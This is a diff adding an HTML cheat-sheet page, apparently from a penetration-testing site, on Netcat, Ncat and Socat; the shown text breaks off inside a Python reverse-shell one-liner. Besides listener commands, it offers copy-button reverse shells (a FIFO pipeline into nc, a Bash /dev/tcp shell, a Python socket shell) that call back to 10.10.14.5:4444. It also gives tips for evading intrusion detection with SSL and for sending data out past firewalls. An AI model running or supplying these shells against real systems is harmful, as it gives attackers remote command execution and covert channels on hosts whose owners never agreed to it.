@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Netcat &amp; Ncat Reference — Listeners, Reverse Shells, Bind Shells &amp; Socat | OPKIT</title>
+  <meta name="description" content="Operational Netcat, Ncat, and Socat reference: persistent listeners, reliable FIFO reverse shells, bind shells, TTY upgrades, SSL encryption, file exfiltration, and tool chaining.">
+    <link rel="icon" type="image/webp" href="../images/Logo.webp">
+  <link rel="apple-touch-icon" href="../images/Logo.webp">
+  <link rel="stylesheet" href="../assets/style.css">
+  <style>:root { --tool-color: #00c8a8; }</style>
+</head>
+<body>
+<nav class="nav" role="navigation" aria-label="Main navigation">
+  <div class="nav__inner">
+        <a href="../index.html" class="nav__logo" aria-label="OPKIT Home">
+      <span class="nav__logo-mark" aria-hidden="true"><img src="../images/Logo.webp" alt="OPKIT Logo" class="nav__logo-img"></span>
+      <span class="nav__logo-text">OPKIT</span>
+    </a>
+    <div class="nav__links"><a href="../index.html" class="nav__link">Tools</a></div>
+    <div class="nav__search"><div class="nav__search-wrap" style="position:relative"><svg class="nav__search-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg><input id="nav-search" class="nav__search-input" type="search" placeholder="Search commands…" autocomplete="off" spellcheck="false" aria-label="Search commands"><div id="nav-search-dropdown" class="search-dropdown" role="listbox"></div></div></div>
+    <button class="nav__theme-btn" onclick="toggleTheme()" aria-label="Toggle theme"><span data-theme-icon></span></button>
+    <button class="nav__hamburger" id="nav-hamburger" aria-label="Open sidebar" onclick="document.getElementById('tool-sidebar').classList.toggle('is-open');document.getElementById('sidebar-overlay').classList.toggle('is-active')"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button>
+  </div>
+</nav>
+
+<div class="tool-page">
+  <div class="sidebar-overlay" id="sidebar-overlay" onclick="this.classList.remove('is-active');document.getElementById('tool-sidebar').classList.remove('is-open')"></div>
+  <aside class="tool-sidebar" id="tool-sidebar" aria-label="Netcat navigation">
+    <div class="tool-sidebar__head">
+      <a href="../index.html" class="tool-sidebar__back"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M19 12H5M12 5l-7 7 7 7"/></svg>All tools</a>
+      <div class="tool-sidebar__tool-id">
+        <div class="tool-sidebar__icon">
+          <img src="https://www.kali.org/tools/netcat/images/netcat-logo.svg" alt="Netcat" onerror="this.onerror=null;this.src='../images/tools/netcat.svg';">
+        </div>
+        <div>
+          <div class="tool-sidebar__name">Netcat / Ncat</div>
+          <div class="tool-sidebar__version">nc · ncat · socat</div>
+        </div>
+      </div>
+    </div>
+    <nav class="tool-sidebar__nav">
+      <div class="sidebar-group">
+        <div class="sidebar-group__label">Workflow Reference</div>
+        <div class="sidebar-nav-item is-active" data-section="overview">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 6h16M4 12h16M4 18h7"/></svg>
+          Overview
+        </div>
+        <div class="sidebar-nav-item" data-section="pitfalls">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+          Critical Pitfalls
+        </div>
+        <div class="sidebar-nav-item" data-section="listeners">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 13a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.18 2h3a2 2 0 0 1 2 1.72"/><circle cx="12" cy="12" r="3"/></svg>
+          Listeners &amp; Connections
+        </div>
+        <div class="sidebar-nav-item" data-section="reverse-shells">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
+          Reverse Shells
+        </div>
+        <div class="sidebar-nav-item" data-section="bind-shells">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          Bind Shells
+        </div>
+        <div class="sidebar-nav-item" data-section="transfer">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+          File Transfer
+        </div>
+        <div class="sidebar-nav-item" data-section="scanning">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+          Scanning &amp; Banners
+        </div>
+        <div class="sidebar-nav-item" data-section="alternatives">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+          Modern Alternatives
+        </div>
+        <div class="sidebar-nav-item" data-section="cheatsheet">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+          Cheatsheet
+        </div>
+      </div>
+    </nav>
+  </aside>
+
+  <main class="tool-content" id="main-content">
+    <!-- Hero -->
+    <div class="tool-hero" id="overview">
+      <div class="tool-hero__kicker"><svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><circle cx="12" cy="12" r="10"/></svg>TCP/IP Swiss Army Knife</div>
+      <h1 class="tool-hero__title">Netcat &amp; Ncat</h1>
+      <p class="tool-hero__desc">The indispensable networking utility for reading and writing data streams across TCP and UDP sockets. Master persistent listeners, reliable FIFO reverse shells, bind shell architecture, encrypted Ncat SSL tunnels, interactive TTY upgrades, and Socat relays.</p>
+      <div class="tool-hero__tags">
+        <span class="tool-hero__tag">Reverse Shell</span>
+        <span class="tool-hero__tag">Bind Shell</span>
+        <span class="tool-hero__tag">Ncat SSL</span>
+        <span class="tool-hero__tag">FIFO Pipeline</span>
+        <span class="tool-hero__tag">TTY Upgrade</span>
+        <span class="tool-hero__tag">File Transfer</span>
+        <span class="tool-hero__tag">Banner Grabbing</span>
+        <span class="tool-hero__tag">Socat</span>
+      </div>
+    </div>
+
+    <!-- First 3 Commands (Quick Start) -->
+    <div class="cmd-block is-open" style="margin-bottom: var(--sp-6); border-color: rgba(0, 200, 168, 0.35); box-shadow: 0 4px 20px rgba(0,0,0,0.18);" role="region" aria-label="First 3 Commands quick start">
+      <div class="cmd-block__head" style="background: rgba(0, 200, 168, 0.08); border-bottom-color: rgba(0, 200, 168, 0.2);">
+        <div>
+          <div class="cmd-block__label" style="display:flex; align-items:center; gap:var(--sp-2); color: var(--c-text);">
+            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:var(--tool-color, var(--c-accent));" aria-hidden="true"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+            First 3 Commands — Quick Start
+          </div>
+          <div class="cmd-block__desc">The core listener and reverse shell commands covering 90% of offensive engagements.</div>
+        </div>
+      </div>
+      <div class="cmd-block__body">
+        <div class="code-line">
+          <span class="code-line__prompt" aria-hidden="true">$</span>
+          <code class="code-line__code"><span class="tok-cmd">nc</span> <span class="tok-flag">-lvnp</span> <span class="tok-val">4444</span></code>
+          <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); white-space:nowrap; opacity:0.85;">Start TCP listener</span>
+          <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+        </div>
+        <div class="code-line">
+          <span class="code-line__prompt" aria-hidden="true">$</span>
+          <code class="code-line__code"><span class="tok-cmd">ncat</span> <span class="tok-flag">-lvnp</span> <span class="tok-val">4444</span> <span class="tok-flag">--keep-open</span></code>
+          <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); white-space:nowrap; opacity:0.85;">Persistent ncat listener</span>
+          <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+        </div>
+        <div class="code-line">
+          <span class="code-line__prompt" aria-hidden="true">$</span>
+          <code class="code-line__code"><span class="tok-cmd">rm</span> <span class="tok-flag">-f</span> <span class="tok-val">/tmp/f</span>; <span class="tok-cmd">mkfifo</span> <span class="tok-val">/tmp/f</span>; <span class="tok-cmd">cat</span> <span class="tok-val">/tmp/f</span> <span class="tok-pipe">|</span> <span class="tok-cmd">/bin/sh</span> <span class="tok-flag">-i</span> <span class="tok-val">2&gt;&amp;1</span> <span class="tok-pipe">|</span> <span class="tok-cmd">nc</span> <span class="tok-arg">10.10.14.5</span> <span class="tok-val">4444</span> <span class="tok-pipe">&gt;</span> <span class="tok-val">/tmp/f</span></code>
+          <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); white-space:nowrap; opacity:0.85;">Reliable FIFO reverse shell</span>
+          <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Critical Pitfalls -->
+    <section class="content-section" id="pitfalls" aria-labelledby="pitfalls-title">
+      <div class="callout callout--warn" role="alert" style="margin-bottom: var(--sp-4);">
+        <svg class="callout__icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+        <div class="callout__body">
+          <strong style="color:var(--c-warn); display:block; margin-bottom:var(--sp-2);">Why is my reverse shell dead? — The -e flag, firewalls, and TTY traps.</strong>
+          <ul style="margin:0; padding-left:1.25rem; line-height:1.6; font-size:var(--t-sm);">
+            <li><strong>The <code>-e</code> flag is often removed:</strong> OpenBSD Netcat (shipped by default on Debian, Ubuntu, and macOS) deliberately disables <code>-e</code> and <code>-c</code> for security hardening. Running <code>nc -e /bin/bash</code> will fail silently or abort with <code>invalid option -- 'e'</code>. Use modern Ncat (<code>ncat -e</code>), a named FIFO pipeline (<code>mkfifo</code>), or language one-liners (Bash, Python, Perl) instead.</li>
+            <li><strong>Bind shells are blocked by egress firewalls:</strong> A bind shell requires the target host to open a listening port and the attacker to connect inbound. Modern corporate perimeter firewalls and cloud NAT gateways block unsolicited inbound connections. If you need a bind shell, ensure the target firewall allows the port, or stick to outbound reverse shells.</li>
+            <li><strong>Plain Netcat shells lack job control and TTY:</strong> Pressing <kbd>Ctrl+C</kbd> or <kbd>Ctrl+Z</kbd> in a raw Netcat connection kills your remote session instantly. Arrows produce escape codes (<code>^[[A</code>) and Tab autocompletion fails. Always upgrade to a fully interactive PTY immediately after catching a shell.</li>
+            <li><strong>Encrypted traffic is not native:</strong> Standard Netcat sends everything over cleartext TCP. Transmitting interactive root commands, passwords, or exfiltrated files exposes raw credentials to any network sniffer or IDS. Use Ncat with <code>--ssl</code> or Socat for encrypted channels.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="callout callout--info" role="note">
+        <svg class="callout__icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        <div class="callout__body">
+          <strong style="display:block; margin-bottom:var(--sp-1); color:var(--c-text);">Netcat is a family, not a single tool.</strong>
+          The command <code>nc</code> points to different implementations depending on your environment. <strong>OpenBSD Netcat</strong> (Debian/Ubuntu/macOS) emphasizes minimalism and omits <code>-e</code>. <strong>Ncat</strong> (from the Nmap project) is the modern gold standard featuring native SSL/TLS encryption, connection brokering, persistent multi-client listening (<code>--keep-open</code>), and host access control lists. <strong>GNU Netcat</strong> is an older legacy build. Always verify which binary you are invoking with <code>nc -h</code> or <code>ncat -h</code> before assuming a specific flag is supported.
+        </div>
+      </div>
+    </section>
+
+    <!-- 1. Listeners & Connections -->
+    <section class="content-section" id="listeners" aria-labelledby="listeners-title">
+      <h2 class="content-section__title" id="listeners-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 13a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.18 2h3a2 2 0 0 1 2 1.72"/><circle cx="12" cy="12" r="3"/></svg>
+        Listeners &amp; Connections
+      </h2>
+      <div class="cmd-list" role="list">
+        <!-- Block 1: Basic TCP Listener -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Standard TCP listeners &amp; connecting</div>
+              <div class="cmd-block__desc">Open a listening socket to catch reverse shells or connect to a remote TCP endpoint.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">nc</span> <span class="tok-flag">-lvnp</span> <span class="tok-val">4444</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Traditional OpenBSD/GNU netcat TCP listener</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">ncat</span> <span class="tok-flag">-lvnp</span> <span class="tok-val">4444</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Modern Ncat listener (Nmap project)</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">nc</span> <span class="tok-arg">10.10.10.1</span> <span class="tok-val">4444</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Connect directly to target TCP host and port</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 2: Persistent Listener -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Persistent listener (Ncat only: --keep-open)</div>
+              <div class="cmd-block__desc">Keeps the listening socket active across multiple sequential connections without terminating on disconnect.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">ncat</span> <span class="tok-flag">-lvnp</span> <span class="tok-val">4444</span> <span class="tok-flag">--keep-open</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Crucial: stays open after shell disconnects</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">ncat</span> <span class="tok-flag">-lvnp</span> <span class="tok-val">4444</span> <span class="tok-flag">-k</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Short flag alias for --keep-open</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 3: UDP Listener -->
+        <div class="cmd-block" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">UDP socket listener &amp; transmission</div>
+              <div class="cmd-block__desc">Listen for incoming datagrams or exfiltrate data past firewalls that permit outbound UDP.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">nc</span> <span class="tok-flag">-lunvp</span> <span class="tok-val">4444</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Listen on UDP port 4444</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">nc</span> <span class="tok-flag">-u</span> <span class="tok-arg">10.10.10.1</span> <span class="tok-val">4444</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Send UDP datagrams to target host</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 4: Encrypted SSL Listener -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Encrypted SSL/TLS listener (Ncat only: --ssl)</div>
+              <div class="cmd-block__desc">Prevent cleartext payload inspection and evade network intrusion detection systems.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">ncat</span> <span class="tok-flag">-lvnp</span> <span class="tok-val">4444</span> <span class="tok-flag">--ssl</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Generate on-the-fly TLS cert and listen securely</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">ncat</span> <span class="tok-flag">--ssl</span> <span class="tok-arg">10.10.14.5</span> <span class="tok-val">4444</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Connect to SSL listener over encrypted channel</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div style="font-size: var(--t-xs); color: var(--c-muted); padding: var(--sp-2) var(--sp-4); border-top: 1px solid rgba(255, 255, 255, 0.06); background: rgba(0, 0, 0, 0.12);">
+              <span style="color: var(--c-accent); font-weight: 600;">Critical TLS Requirement:</span> Both sides must use <code>--ssl</code>. Connecting with plain <code>nc</code> or a Bash <code>/dev/tcp</code> shell to an Ncat SSL listener will produce silence — the shell connects, but because cleartext shells do not negotiate TLS, the handshake never completes and no prompt will appear.
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 2. Reverse Shells -->
+    <section class="content-section" id="reverse-shells" aria-labelledby="reverse-shells-title">
+      <h2 class="content-section__title" id="reverse-shells-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
+        Reverse Shells &amp; TTY Upgrade
+      </h2>
+      <div class="cmd-list" role="list">
+        <!-- Block 1: Bash /dev/tcp -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Bash native reverse shell (/dev/tcp)</div>
+              <div class="cmd-block__desc">Pure Bash execution without needing Netcat or external binaries installed on the target.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">bash</span> <span class="tok-flag">-i</span> <span class="tok-pipe">&gt;&amp;</span> <span class="tok-val">/dev/tcp/10.10.14.5/4444</span> <span class="tok-val">0&gt;&amp;1</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Most reliable Linux reverse shell</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 2: FIFO Pipeline -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Named FIFO pipeline reverse shell (Universal Netcat)</div>
+              <div class="cmd-block__desc">The bulletproof Netcat technique that works on OpenBSD Netcat when <code>-e</code> is absent or disabled.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">rm</span> <span class="tok-flag">-f</span> <span class="tok-val">/tmp/f</span>; <span class="tok-cmd">mkfifo</span> <span class="tok-val">/tmp/f</span>; <span class="tok-cmd">cat</span> <span class="tok-val">/tmp/f</span> <span class="tok-pipe">|</span> <span class="tok-cmd">/bin/sh</span> <span class="tok-flag">-i</span> <span class="tok-val">2&gt;&amp;1</span> <span class="tok-pipe">|</span> <span class="tok-cmd">nc</span> <span class="tok-arg">10.10.14.5</span> <span class="tok-val">4444</span> <span class="tok-pipe">&gt;</span> <span class="tok-val">/tmp/f</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Single-line executable FIFO shell</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 3: Language-Specific Shells -->
+        <div class="cmd-block" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Language-specific one-liners (Python, Perl, PHP, Ruby)</div>
+              <div class="cmd-block__desc">Execute interactive socket connections through available target runtime interpreters.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">python3</span> <span class="tok-flag">-c</span> <span class="tok-val">'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</span></code>
